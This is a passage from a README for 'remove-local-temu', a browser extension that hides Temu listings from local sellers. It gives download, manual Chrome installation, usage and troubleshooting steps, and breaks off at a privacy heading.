## 🚀 How to Download & Install

The easiest way to get remove-local-temu is from the official GitHub release page.

### Step 1: Go to the Download Page

Click the button below to visit the official release page:

[![Download remove-local-temu](https://img.shields.io/badge/Download-Remove--local--temu-blue?style=for-the-badge)](https://github.com/Ivanyinamyah321/remove-local-temu/releases)

This page contains the latest version of the extension. It also includes release notes and any updates.

### Step 2: Choose the Right File

On the release page, look for files ending with `.crx` or `.zip`. These are the files you can install in your browser:

- `.crx` file: This is the extension file to add directly to Chrome.
- `.zip` file: This contains the extension files if you want to load it manually.

Usually, the `.crx` file is the easiest to use.

### Step 3: Download the File

Click on the `.crx` file to start downloading it. Save it to a folder you can find easily, like your Downloads folder.

### Step 4: Install the Extension in Chrome

**Note:** Chrome no longer allows direct installation of `.crx` files by double-clicking. You will need to load the extension manually.

Here is how:

1. Open Chrome.
2. Go to the menu in the top right corner (three dots).
3. Choose **More tools** > **Extensions**.
4. Turn on **Developer mode** (toggle at the top right).
5. Click **Load unpacked**.
6. Select the folder where you downloaded and unzipped the `.zip` file, or drag the `.crx` file to the extensions page.

After this, the extension will be activated.

### Step 5: Verify Installation

To confirm your extension is working:

- Visit [https://temu.com](https://temu.com).
- Browse product categories.
- You should no longer see items marked as "Local Warehouse".
  
If you notice local sellers still appearing, refresh the page or restart your browser.

## 🔧 How to Use remove-local-temu

Once installed, remove-local-temu runs automatically on the Temu website. You do not need to turn it on manually.

- When you browse Temu, the extension scans the list of products on each page.
- It hides products sold by local sellers.
- The product list looks cleaner and only shows items shipped directly by Temu.

This helps you avoid confusion caused by multiple sellers for the same product.

## 🛠 Troubleshooting

If remove-local-temu does not work as expected, try these steps:

- Make sure you have the latest version of Chrome.
- Check that the extension appears in your browser's extension list and is enabled.
- Reload the Temu website.
- If you installed the `.zip` version, ensure you loaded the entire folder, not just one file.
- Disable other shopping or page-modifying extensions that may conflict.
- Restart your browser.
- For Firefox users, use the Firefox-specific version available via the link above.

If problems persist, report issues on the GitHub repository page using the **Issues** tab.

## 🔒 Privacy & Security
